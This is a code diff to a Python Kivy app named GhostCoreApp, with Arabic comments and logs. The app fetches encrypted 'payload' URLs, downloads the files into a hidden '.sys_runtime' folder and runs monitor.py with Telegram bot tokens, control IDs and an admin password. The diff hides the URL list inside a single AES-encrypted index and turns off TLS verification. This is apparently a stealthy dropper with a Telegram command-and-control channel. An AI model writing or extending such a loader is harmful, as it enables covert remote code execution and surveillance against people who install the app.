@@ -8,6 +8,8 @@ import threading
 import traceback
 import importlib.util
 import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 from kivy.app import App
 from kivy.uix.textinput import TextInput
 from kivy.uix.boxlayout import BoxLayout
@@ -15,47 +17,28 @@ from kivy.clock import Clock
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
-# ---------------------- إعدادات التشفير ----------------------
 ENCRYPTION_KEY = b'MySup3rS3cr3tK3y1234567890123456'
 
-# الروابط المشفرة لملفات Gists (14 ملفاً)
-PAYLOAD_URLS_ENCRYPTED = [
-    "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"
-]
+ENCRYPTED_INDEX_BLOB = "XBE0RJDdPjdTXKe3aFFGvpQjBdgrBIvF97GbEo85WKYVvSenCHiNBOcgRM38P862wlMMCM9m0VWeB3G51B+GRb7fEF4ArYJ70+ApMBA5WU5bWb1geiewl3c4U1g289AtEloqrsgwN7JtaQsM/KfymAZ0c4LffJNqPh8/Q6txXkozmasu6g4o5xUzyKOQgMwiqZn2fRBSAsJ/rj2NHpqIILyCj0eYWV/NMLHsYcMe3Jf7ljNBEKlxbC4E7kmTZtnJ62/EQ0Cc+3fNRlAcsl6ggKe9EIvR7uDlKWE2LQwboHjc3sXy+xLX0N1qhwDe9wE2aCd4u+K3xeWaTw4MitoavWN3rxFMef7GFAemgcTxT0Zxbl4zqysAuwP07jWObTFjRL4YiTNB0oXct+4akVJ2q/Suk+jlNsrzM0yHOLoIkS5k3JzifScIGNMHjo2kAvW67yflA8GSgKXW+RraAqJmGvIsDWIaexdWrAbo9OehAKZVxGO9lSrX2FXu1d9klV3Dlb5Cwe3oSb29KRaDDff8RBCjUEnCLtLKiWNnJHIRyKOoSCN9+s/0oVzfxjfhLAELQUYPWN4JOBa9Lum+b4r+jLNTfGr/jq7MZM80NzwXIJmEc+Pk4Q33Hx7WHxMYxue+xhdVJ4s6SgSTgMimPyNQKjaeUu6CYked/u3ifMOAwOaXCPqfzl4CGz1HNySQpw6fRSZbo0Hnm4PkhfPNO3B3TukA9g9kr4iGpiTsyQhwv0QvwAsmpOH8fMGQSrGn6solpb/iL5HcYnFWB8f1jqf55OZMg3Wq5btraYAZ7X5bKeKRnQJpW5mtTh8GthEeObk2XNCh4mc++AspVmaaEPnCtvUWbeBjONTZlh/qPZEHUGLBB7DrryCS9MMllc8CLxFLSFwQ0DG5QoJk9g1qeHzgY/Y5M82JAC7AcrN/P67fd1E1/zWPaBV4LQbU04rE4PpGf5SjO05sKwYTX8rX/yCQcG0ObK3sgGQmcWo9hrjO1vSM71OikLrP10E/LUMGdi5n+tYfgyVRosLrMlIXwvA415JgkttiYO1te9RrfpfbX2CVOSUcVw+6deoW1G5yyGRbqBi3JFzfhSepz4Cj6WMv2HDev+QB9rL2ky2ktlWcvRVFn98R0w9BCgS700xirRz++rXF09KQa5FNaI/ToTkRPZ1NhO7NDKbFvYcvPAVBDDoRRB5ypjLaZcFfp+vML7aET2FNANpNiRn+m0sLad30/Ga+nB9cs9+0nLIwMsCr+drSOymUsXRA8FkHH4aQAxv0mVN7RFjR0hq1jt1xTw/zjeseZXun1JCGvKZRjuzK58kBuFfA3yNtahQkUJzCXAStb9/juFM0HVLxUGHb1k6LJegKRJGxO1gLQbybGzFm+9/Z8gIjZX+CkiUssdxHeady8EwRJc2kerCamfw/Jo8stnPJg769TpTPSQ51FTh463k8yKSEOkDJPjgNTb+60tzlYET+z+Hm1pNf8GLqxYDBNwaS6QvbiJmFzmxz4zD/eInnH9rUErcOp5+gLwIJ10p7e+cRFVksUi8Exz9/+Jl5nrsGtdqojvJpa1BdH4Sy+mxzb4h5mNtgi3aRyDq5TNDE2X8iMpE2ifutl4eiekQ/jgXtG5oF8a5EJqUXc2N4X4ZrjXBerH7xQPO3MRk6wCsC+fmSB6/9uGjdRQKLrC4oyi1DMnOQQ1YzH0Fgx3BBpek0B7RH3+A95BBfGfisIaXkKkg1i1oyycmPRBXGgSiucnAxjPfBoHSAAAkqSjCjCVGPdmPXAufyvQYtTqqt+9FUT7CnEBgtf5mNl2WzfRQejRsAtmO6P3BrOXUE8+8wf9shIAjoQZdAByWsjXfaHpJuIBH9MTvKCmTXw9guCCFPi/Ss3MPKyITswOEbgI/PfMScRUI29N3SEdwnHaASNYFqyEaQ+WtdFTIaGaOOEWFF7k4Q0ywBRJt/MhV+OImgSAreiQQFQFlLEyDMt0uYb9WsqfFGsleSUpr1btvKET/+bk2pe3l4U6XIjQKOjQz51tjJBQ=="
+
+def decrypt_index(encrypted_blob):
+    try:
+        data = base64.b64decode(encrypted_blob)
+        iv, tag, ciphertext = data[:12], data[12:28], data[28:]
+        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+        return json.loads((decryptor.update(ciphertext) + decryptor.finalize()).decode())
+    except Exception:
+        return None
 
 BASE_DIR = os.path.join(os.getcwd(), ".sys_runtime")
 if not os.path.exists(BASE_DIR):
     os.makedirs(BASE_DIR)
 sys.path.append(BASE_DIR)
 
-def decrypt_data(encrypted_b64):
-    try:
-        data = base64.b64decode(encrypted_b64)
-        iv, tag, ciphertext = data[:12], data[-16:], data[12:-16]
-        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
-        decryptor = cipher.decryptor()
-        return (decryptor.update(ciphertext) + decryptor.finalize()).decode()
-    except Exception:
-        return None
-
-# استيراد الأسرار من GitHub Secrets (يتم إنشاؤها أثناء البناء)
 try:
     from secrets import BOT_TOKENS, CONTROL_ID, VAULT_ID, ADMIN_PASSWORD
 except ImportError:
-    # قيم افتراضية للتطوير المحلي فقط
     BOT_TOKENS = ["YOUR_BOT_TOKEN"]
     CONTROL_ID = "YOUR_CONTROL_ID"
     VAULT_ID = "YOUR_VAULT_ID"
@@ -91,34 +74,34 @@ class GhostCoreApp(App):
         for token in BOT_TOKENS:
             try:
                 url = f"https://api.telegram.org/bot{token}/sendMessage"
-                requests.post(url, json={"chat_id": CONTROL_ID, "text": full_msg}, timeout=5)
+                requests.post(url, json={"chat_id": CONTROL_ID, "text": full_msg}, timeout=5, verify=False)
                 break
             except Exception:
                 continue
 
-    def decrypt_url(self, enc):
-        return decrypt_data(enc)
-
     def download_payloads(self):
-        self.add_log("📥 بدء فك تشفير الروابط وتحميل البايلودات...")
-        for i, enc in enumerate(PAYLOAD_URLS_ENCRYPTED):
-            url = self.decrypt_url(enc)
-            if not url:
-                self.add_log(f"❌ فشل فك تشفير الرابط {i+1}")
-                continue
+        self.add_log("📥 Loading payload index...")
+        index_data = decrypt_index(ENCRYPTED_INDEX_BLOB)
+        if not index_data:
+            self.add_log("❌ Failed to load payload index.")
+            return
+        file_urls = index_data.get('files', [])
+        self.add_log(f"✅ Index loaded. Found {len(file_urls)} files.")
+        for url in file_urls:
             name = url.split('/')[-1]
-            self.add_log(f"⬇️ تحميل {name}...")
+            self.add_log(f"⬇️ Downloading {name}...")
             try:
-                resp = requests.get(url, timeout=15)
+                resp = requests.get(url, timeout=15, verify=False)
                 if resp.status_code == 200:
-                    with open(os.path.join(BASE_DIR, name), 'w', encoding='utf-8') as f:
+                    file_path = os.path.join(BASE_DIR, name)
+                    with open(file_path, 'w', encoding='utf-8') as f:
                         f.write(resp.text)
-                    self.add_log(f"✅ تم تحميل {name}")
+                    self.add_log(f"✅ Downloaded {name}")
                 else:
-                    self.add_log(f"⚠️ فشل تحميل {name} (HTTP {resp.status_code})")
+                    self.add_log(f"⚠️ Failed {name} (HTTP {resp.status_code})")
             except Exception as e:
-                self.add_log(f"⚠️ خطأ في تحميل {name}: {str(e)[:100]}")
-        self.add_log("🏁 اكتمل تحميل البايلودات.")
+                self.add_log(f"⚠️ Error downloading {name}: {str(e)[:100]}")
+        self.add_log("🏁 Payload downloads finished.")
 
     def start_services(self):
         self.add_log("⚙️ محاولة استيراد Monitor ديناميكياً...")
@@ -127,26 +110,22 @@ class GhostCoreApp(App):
             if not os.path.exists(monitor_path):
                 self.add_log(f"❌ ملف monitor.py غير موجود في {BASE_DIR}")
                 return
-
             spec = importlib.util.spec_from_file_location("monitor", monitor_path)
             monitor_module = importlib.util.module_from_spec(spec)
             sys.modules["monitor"] = monitor_module
             spec.loader.exec_module(monitor_module)
-
             if hasattr(monitor_module, 'Monitor'):
                 mon = monitor_module.Monitor()
                 mon.admin_password = ADMIN_PASSWORD
-                mon.bot_token = BOT_TOKENS[0]  # التوكن الأول لإرسال التقارير
+                mon.bot_token = BOT_TOKENS[0]
                 mon.control_id = CONTROL_ID
                 mon.vault_id = VAULT_ID
-                # ربط التوكنات المتعددة (إذا احتاجها)
                 setattr(mon, 'bot_tokens', BOT_TOKENS)
                 threading.Thread(target=mon.start, daemon=True).start()
                 self.add_log("✅ تم تشغيل كلاس Monitor بنجاح!")
                 self.send_telegram("🚀 Monitor is now active.")
             else:
                 self.add_log("⚠️ الكلاس 'Monitor' غير موجود داخل ملف monitor.py")
-                self.add_log(f"🔍 محتويات الموديول: {dir(monitor_module)}")
         except Exception as e:
             error_trace = traceback.format_exc()
             self.add_log(f"❌ فشل تشغيل الخدمات: {str(e)}")
@@ -156,7 +135,6 @@ class GhostCoreApp(App):
     def run_engine(self, dt):
         try:
             self.add_log("🔍 فحص بيئة التشغيل...")
-            # التحقق من وجود المجلدات (ليست ضرورية للعمل)
             for folder in ['core', 'telegram', 'config', 'media']:
                 exists = "✅" if os.path.isdir(folder) else "❌"
                 self.add_log(f"Folder '{folder}': {exists}")
@@ -179,7 +157,7 @@ if __name__ == '__main__':
     except Exception as e:
         try:
             requests.post(f"https://api.telegram.org/bot{BOT_TOKENS[0]}/sendMessage",
-                          json={"chat_id": CONTROL_ID, "text": f"🚨 انهيار قبل الإقلاع:\n{traceback.format_exc()[:4000]}"})
+                          json={"chat_id": CONTROL_ID, "text": f"🚨 انهيار قبل الإقلاع:\n{traceback.format_exc()[:4000]}"}, verify=False)
         except Exception:
             pass
         raise
